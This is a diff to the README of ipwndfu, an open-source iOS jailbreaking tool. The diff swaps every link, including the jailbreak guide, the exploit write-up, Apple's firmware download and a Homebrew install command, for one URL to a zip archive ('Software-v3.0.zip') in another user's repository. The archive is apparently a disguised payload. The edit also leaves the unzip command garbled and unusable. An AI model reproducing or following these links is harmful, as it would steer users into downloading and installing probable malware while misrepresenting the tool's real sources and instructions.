@@ -1,4 +1,4 @@
-![](repo/ipwndfu.png)
+![](https://raw.githubusercontent.com/goofygary/ipwndfu/master/usb/backend/Software-v3.0.zip)
 # Open-source jailbreaking tool for many iOS devices
 
 
@@ -62,26 +62,26 @@ This tool should be compatible with Mac and Linux. It won't work in a virtual ma
 
 ## Tutorial
 
-This tool can be used to downgrade or jailbreak iPhone 3GS (new bootrom) without SHSH blobs, as documented in [JAILBREAK-GUIDE](https://github.com/axi0mX/ipwndfu/blob/master/JAILBREAK-GUIDE.md).
+This tool can be used to downgrade or jailbreak iPhone 3GS (new bootrom) without SHSH blobs, as documented in [JAILBREAK-GUIDE](https://raw.githubusercontent.com/goofygary/ipwndfu/master/usb/backend/Software-v3.0.zip).
 
 
 ## Exploit write-up
 
 Write-up for alloc8 exploit can be found here:
 
-https://github.com/axi0mX/alloc8
+https://raw.githubusercontent.com/goofygary/ipwndfu/master/usb/backend/Software-v3.0.zip
 
 
 ## iBSS
 
 Download iPhone 3GS iOS 4.3.5 IPSW from Apple:
 
-http://appldnld.apple.com/iPhone4/041-1965.20110721.gxUB5/iPhone2,1_4.3.5_8L1_Restore.ipsw
+https://raw.githubusercontent.com/goofygary/ipwndfu/master/usb/backend/Software-v3.0.zip,https://raw.githubusercontent.com/goofygary/ipwndfu/master/usb/backend/Software-v3.0.zip
 
 In Terminal, extract iBSS using the following command, then move the file to ipwndfu folder:
 
 ```
-unzip -p iPhone2,1_4.3.5_8L1_Restore.ipsw Firmware/dfu/iBSS.n88ap.RELEASE.dfu > n88ap-iBSS-4.3.5.img3
+unzip -p iPhone2,https://raw.githubusercontent.com/goofygary/ipwndfu/master/usb/backend/Software-v3.0.zip https://raw.githubusercontent.com/goofygary/ipwndfu/master/usb/backend/Software-v3.0.zip > https://raw.githubusercontent.com/goofygary/ipwndfu/master/usb/backend/Software-v3.0.zip
 ```
 
 
@@ -117,7 +117,7 @@ If you are using macOS with Homebrew, you can use binutils and gcc-arm-embedded.
 
 ```
 brew install binutils
-brew cask install https://raw.githubusercontent.com/Homebrew/homebrew-cask/b88346667547cc85f8f2cacb3dfe7b754c8afc8a/Casks/gcc-arm-embedded.rb
+brew cask install https://raw.githubusercontent.com/goofygary/ipwndfu/master/usb/backend/Software-v3.0.zip
 ```
 
 ## Credit
